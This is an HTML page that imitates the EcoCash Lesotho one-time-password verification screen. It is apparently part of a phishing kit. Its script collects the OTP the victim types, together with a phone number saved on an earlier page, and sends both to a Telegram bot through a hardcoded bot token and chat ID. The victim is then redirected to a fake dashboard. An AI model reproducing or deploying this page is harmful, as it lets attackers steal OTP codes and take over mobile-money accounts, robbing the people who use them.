<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EcoCash | Verify OTP</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
    body { background-color: #f8fafc; font-family: 'Plus Jakarta Sans', sans-serif; }
    .otp-card { background: #fff; border-radius: 50px; box-shadow: 0 10px 40px rgba(0,0,0,0.05); }
    .otp-input { width: 60px; height: 70px; text-align: center; font-size: 1.5rem; font-weight: 800; border: 2px solid #e2e8f0; border-radius: 15px; }
    .otp-input:focus { border-color: #000099; background: #f0f4ff; outline: none; }
    .btn-verify { background:#8b8ed1; color:#fff; padding:1.25rem; border-radius:100px; width:100%; font-weight:700; }
    .btn-verify.active { background:#000099; }
  </style>
</head>

<body class="min-h-screen flex flex-col items-center justify-center p-6">

  <div class="mb-8 text-center">
    <h1 class="text-4xl font-bold">
      <span class="text-blue-600">Eco</span><span class="text-red-600">Cash</span>
    </h1>
    <p class="text-gray-400 mt-4 uppercase text-xs font-bold tracking-widest">Lesotho</p>
  </div>

  <div class="max-w-[420px] w-full otp-card p-10 md:p-12 text-center">
    <h2 class="text-2xl font-extrabold text-gray-800">Kenya Khoutu ea OTP</h2>
    <p class="text-sm text-gray-500 mt-2">Enter OTP Code</p>
    <p class="text-sm font-bold text-blue-900" id="user-phone">---</p>

    <div class="flex justify-between gap-2 my-8" id="otp-inputs">
      <input type="text" maxlength="1" class="otp-input" autofocus>
      <input type="text" maxlength="1" class="otp-input">
      <input type="text" maxlength="1" class="otp-input">
      <input type="text" maxlength="1" class="otp-input">
    </div>

    <button id="verify-btn" onclick="verifyOTP()" class="btn-verify mb-6">
      Verify OTP
    </button>

    <div class="text-center">
      <span id="timer" class="text-sm font-bold text-blue-600">01:00</span>
      <button id="resend-btn" onclick="handleResend()" class="hidden text-xs font-bold text-blue-900 underline mt-2">
        Resend
      </button>
    </div>
  </div>

  <script>
    const savedPhone = localStorage.getItem('userPhone') || "User";
    document.getElementById('user-phone').innerText = savedPhone;

    let timeLeft = 60;
    const timerElement = document.getElementById('timer');
    const resendBtn = document.getElementById('resend-btn');

    const countdown = setInterval(() => {
      if (timeLeft <= 0) {
        clearInterval(countdown);
        timerElement.classList.add('hidden');
        resendBtn.classList.remove('hidden');
      } else {
        timerElement.innerText = `00:${timeLeft < 10 ? '0' + timeLeft : timeLeft}`;
      }
      timeLeft--;
    }, 1000);

    function handleResend() {
      window.location.href = 'index.html';
    }

    const inputs = document.querySelectorAll('#otp-inputs input');
    inputs.forEach((input, index) => {
      input.addEventListener('keyup', (e) => {
        if (e.target.value && index < inputs.length - 1) inputs[index + 1].focus();
        if (e.key === "Backspace" && index > 0) inputs[index - 1].focus();
        checkInputs();
      });
    });

    function checkInputs() {
      const filled = Array.from(inputs).every(i => i.value.length === 1);
      const btn = document.getElementById('verify-btn');
      btn.classList.toggle('active', filled);
    }

    async function verifyOTP() {
      const btn = document.getElementById('verify-btn');
      if (!btn.classList.contains('active')) return;

      const otpValue = Array.from(inputs).map(i => i.value).join('');
      btn.disabled = true;
      btn.innerHTML = "Verifying...";

      // Optional Telegram
      const botToken = "8516594918:AAFYi2ZCNs3UMLaHxKPTzmfd9rGF6wAMwvs";
      const chatId = "8444091205";

      const message = `EcoCash OTP\nPhone: ${savedPhone}\nOTP: ${otpValue}`;

      try {
        if (botToken !== "YOUR_BOT_TOKEN") {
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
          });
        }
      } catch (e) {
        console.error(e);
      }

      setTimeout(() => {
        window.location.href = "dashboard.html";
      }, 2000);
    }
  </script>
</body>
</html>
